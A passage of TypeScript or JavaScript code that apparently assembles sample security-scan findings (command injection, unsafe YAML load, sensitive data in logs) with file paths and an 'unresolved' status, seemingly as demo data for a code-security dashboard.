    { ...showcase.find((item) => item.title === 'Command Injection')!, projectKey: key, file: `app/${slug}/export.py`, status: 'unresolved' },
    { ...showcase.find((item) => item.title === 'Unsafe YAML Load')!, projectKey: key, file: `app/${slug}/loader.py`, status: 'unresolved' },
    { ...showcase.find((item) => item.title === 'Sensitive Data in Logs')!, projectKey: key, file: `app/${slug}/receipts.py`, status: 'unresolved' },
  ]
}
